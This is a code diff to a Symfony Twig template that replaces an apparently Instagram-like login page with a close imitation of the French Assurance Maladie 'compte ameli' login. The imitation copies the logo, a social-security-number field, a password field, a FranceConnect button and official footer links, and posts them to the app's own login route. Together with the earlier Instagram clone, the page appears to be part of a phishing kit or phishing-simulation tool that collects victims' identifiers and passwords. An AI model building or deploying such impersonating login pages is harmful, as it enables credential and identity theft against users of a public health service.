+    .ameli-footer-links a {
+        border-right: none;
+        padding: 4px 8px;
+    }
+}
+</style>
+{% endblock %}
+
+{% block body %}
+<div class="ameli-page">
+
+    <!-- ═══════════════ NAVBAR ═══════════════ -->
+    <nav class="ameli-navbar" id="ameliNavbar">
+        <a href="{{ path('app_welcome') }}" class="ameli-navbar-logo">
+            <img src="{{ asset('images/ameli_assurance_logo.png') }}" alt="l'Assurance Maladie">
+        </a>
+        <div class="ameli-navbar-divider"></div>
+        <div class="ameli-navbar-title">Compte <span>ameli</span></div>
+    </nav>
+
+    <!-- ═══════════════ CONTENU PRINCIPAL ═══════════════ -->
+    <main class="ameli-main">
+        <div class="ameli-login-card">
+
+            <h1 class="ameli-login-title">J'accède à mon compte ameli</h1>
+
+            <!-- Note champs obligatoires -->
+            <p class="ameli-required-note">Tous les champs sont obligatoires.</p>
+
+            {# Erreur Symfony #}
+            {% if error is defined and error %}
+                <div class="ameli-alert">
+                    <span class="material-icons-outlined">error_outline</span>
+                    {{ error }}
+                </div>
+            {% endif %}
+
+            {# Formulaire de connexion #}
+            <form method="POST" action="{{ path('app_login') }}" novalidate id="ameliLoginForm">
+                <input type="hidden" name="_csrf_token" value="{{ csrf_token('authenticate') }}">
+
+                <!-- Champ numéro de sécurité sociale -->
+                <div class="ameli-field-group">
+                    <div class="ameli-input-row">
+                        <span class="ameli-input-icon">
+                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+                                <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
+                                <circle cx="12" cy="7" r="4"/>
+                            </svg>
+                        </span>
+                        <input type="hidden" name="_username" id="inputIdentifierHidden" value="{{ last_username ?? '' }}">
+                        <input
+                            type="text"
+                            id="inputIdentifier"
+                            class="ameli-input"
+                            placeholder="Mon numéro de sécurité sociale"
+                            value="{{ last_username ?? '' }}"
+                            autocomplete="off"
+                            inputmode="numeric"
+                            maxlength="18"
+                            required>
+                    </div>
+                    <a href="#" class="ameli-field-link">Où trouver mon numéro de sécurité sociale ?</a>
+                </div>
+
+                <!-- Champ mot de passe -->
+                <div class="ameli-field-group">
+                    <div class="ameli-input-row">
+                        <span class="ameli-input-icon">
+                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+                                <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
+                                <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+                            </svg>
+                        </span>
+                        <input
+                            type="password"
+                            name="_password"
+                            id="inputPassword"
+                            class="ameli-input"
+                            placeholder="Mon mot de passe (ou code provisoire)"
+                            autocomplete="current-password"
+                            required>
+                        <button type="button" class="ameli-toggle-password" id="togglePassword" title="Afficher/masquer le mot de passe">
+                            <svg id="eyeIcon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+                                <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/>
+                                <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/>
+                                <path d="M1 1l22 22"/>
+                                <path d="M14.12 14.12a3 3 0 1 1-4.24-4.24"/>
+                            </svg>
+                        </button>
+                    </div>
+                    <a href="#" class="ameli-field-link">Mot de passe oublié ?</a>
+                </div>
+
+                <!-- Bouton Me Connecter -->
+                <button type="submit" class="ameli-btn-connect" id="btnLogin">
+                    ME CONNECTER
+                </button>
+            </form>
+
+            <!-- Séparateur OU -->
+            <div class="ameli-separator">
+                <div class="ameli-separator-line"></div>
+                <span class="ameli-separator-text">OU</span>
+                <div class="ameli-separator-line"></div>
+            </div>
+
+            <!-- Section FranceConnect -->
+            <div class="ameli-fc-section">
+                <p class="ameli-fc-description">
+                    FranceConnect est la solution proposée par <strong>l'État</strong> pour<br>
+                    sécuriser et simplifier la connexion à vos services en ligne.
+                </p>
+                <a href="#" class="ameli-fc-btn">
+                    <img src="{{ asset('images/franceconnect_btn.png') }}" alt="S'identifier avec FranceConnect">
+                </a>
+                <a href="#" class="ameli-fc-link">Qu'est-ce que FranceConnect ?</a>
+            </div>
+
+            <!-- Créer un compte -->
+            <div class="ameli-create-account">
+                Première visite ? <a href="#">Créer un compte</a>
+            </div>
+
+        </div>
+    </main>
+
+    <!-- ═══════════════ FOOTER ═══════════════ -->
+    <footer class="ameli-footer" id="ameliFooter">
+        <div class="ameli-footer-logo">
+            <img src="{{ asset('images/ameli_assurance_logo.png') }}" alt="l'Assurance Maladie">
+        </div>
+        <div class="ameli-footer-links">
+            <a href="#">Mentions légales et CGU</a>
+            <a href="#">Aide et Accessibilité : non conforme</a>
+            <a href="#">Recommandations de sécurité</a>
+            <a href="#">Protection des données personnelles</a>
+        </div>
+        <a href="#" class="ameli-footer-site">Site Ameli</a>
+    </footer>
 
 </div>
-{# fin ig-page #}
 
-<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
 <script>
 document.addEventListener('DOMContentLoaded', function() {
-	// ── Login button activation ──
-	var pw = document.getElementById('inputPassword');
-	var btn = document.getElementById('btnLogin');
-	pw.addEventListener('input', function() {
-		btn.disabled = pw.value.length < 6;
-	});
+    // ── Toggle password visibility ──
+    var toggleBtn = document.getElementById('togglePassword');
+    var pwInput = document.getElementById('inputPassword');
+    var eyeIcon = document.getElementById('eyeIcon');
 
-	// ── Image Carousel ──
-	var carousel = document.getElementById('igCarousel');
-	var images = carousel.querySelectorAll('.ig-carousel-img');
-	var currentIndex = 0;
-	var isAnimating = false;
+    toggleBtn.addEventListener('click', function() {
+        if (pwInput.type === 'password') {
+            pwInput.type = 'text';
+            eyeIcon.innerHTML = '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>';
+        } else {
+            pwInput.type = 'password';
+            eyeIcon.innerHTML = '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/><path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/><path d="M1 1l22 22"/><path d="M14.12 14.12a3 3 0 1 1-4.24-4.24"/>';
+        }
+    });
 
-	function goToSlide(index) {
-		if (isAnimating || index === currentIndex) return;
-		isAnimating = true;
+    // ── Formatage numéro de sécurité sociale (1 23 45 67 890 900) ──
+    var usernameInput = document.getElementById('inputIdentifier');
+    var hiddenInput = document.getElementById('inputIdentifierHidden');
+    var btnLogin = document.getElementById('btnLogin');
 
-		images[currentIndex].classList.remove('active');
-		currentIndex = index;
-		images[currentIndex].classList.add('active');
+    function formatNIR(value) {
+        var digits = value.replace(/\D/g, '').substring(0, 13);
+        var parts = [];
+        if (digits.length > 0) parts.push(digits.substring(0, 1));
+        if (digits.length > 1) parts.push(digits.substring(1, 3));
+        if (digits.length > 3) parts.push(digits.substring(3, 5));
+        if (digits.length > 5) parts.push(digits.substring(5, 7));
+        if (digits.length > 7) parts.push(digits.substring(7, 10));
+        if (digits.length > 10) parts.push(digits.substring(10, 13));
+        return parts.join(' ');
+    }
 
-		setTimeout(function() {
-			isAnimating = false;
-		}, 600);
-	}
+    usernameInput.addEventListener('input', function() {
+        var cursorPos = this.selectionStart;
+        var oldLength = this.value.length;
+        var formatted = formatNIR(this.value);
+        this.value = formatted;
+        // Synchroniser le champ caché (sans espaces)
+        hiddenInput.value = formatted.replace(/\s/g, '');
+        // Ajuster le curseur
+        var newLength = this.value.length;
+        var newCursor = cursorPos + (newLength - oldLength);
+        this.setSelectionRange(newCursor, newCursor);
+        checkFields();
+    });
 
-	carousel.addEventListener('click', function() {
-		var nextIndex = (currentIndex + 1) % images.length;
-		goToSlide(nextIndex);
-	});
+    // Empêcher la saisie de lettres
+    usernameInput.addEventListener('keypress', function(e) {
+        if (e.key.length === 1 && !/\d/.test(e.key)) {
+            e.preventDefault();
+        }
+    });
+
+    // ── Login button activation ──
+    function checkFields() {
+        var digits = usernameInput.value.replace(/\D/g, '');
+        btnLogin.disabled = !(digits.length === 13 && pwInput.value.length >= 1);
+    }
+
+    pwInput.addEventListener('input', checkFields);
+
+    // Initial state
+    checkFields();
 });
 </script>
 {% endblock %}
